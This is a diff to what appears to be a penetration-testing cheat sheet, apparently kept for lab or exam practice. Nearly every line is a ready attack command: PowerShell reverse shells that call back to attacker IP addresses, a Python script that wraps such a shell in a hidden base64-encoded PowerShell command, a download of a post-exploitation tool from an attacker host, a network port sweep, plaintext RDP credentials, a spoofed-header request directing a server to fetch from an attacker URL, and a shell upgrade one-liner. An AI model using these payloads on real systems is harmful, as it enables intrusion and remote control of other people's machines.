@@ -33,7 +33,7 @@ $client = New-Object System.Net.Sockets.TCPClient('192.168.45.230',4444);$stream
 
 Base64 encoding for powershell
 ```
-$MyBase6 = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('$client = New-Object System.Net.Sockets.TCPClient("192.168.45.186",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' ))
+$MyBase6 = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('$client = New-Object System.Net.Sockets.TCPClient("192.168.45.",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' ))
 
 $Bytes=[Convert]::FromBase64String($Text)
 [System.Text.Encoding]::Unicode.GetString($Bytes)
@@ -61,4 +61,32 @@ iwr -uri http://192.168.45.204:9090/Seatbelt.exe -Outfile seat.exe
 network scanning
 for i in $(seq 1 254); do nc -zv -w 1 172.16.203.$i 445; done
 
-xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:192.168.50.64
+xfreerdp /u:justin /p:_SuperS3cure1337#_ /v:192.168.203.202
+
+curl -X POST http://192.168.174.134:13337/update -H "Content-Type: application/json" -H "X-Forwarded-For: localhost" --data '{"user":"clumsyadmin","url":"http://192.168.45.230:8000/mint"}'
+
+```
+import sys
+import base64
+
+payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.118.2",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
+
+cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
+
+print(cmd)
+
+```
+
+php reverse shell
+
+https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php
+
+
+```
+import os
+os.popen("id").read()
+```
+
+### Upgrade shell
+
+python3 -c 'import pty; pty.spawn("/bin/sh")'
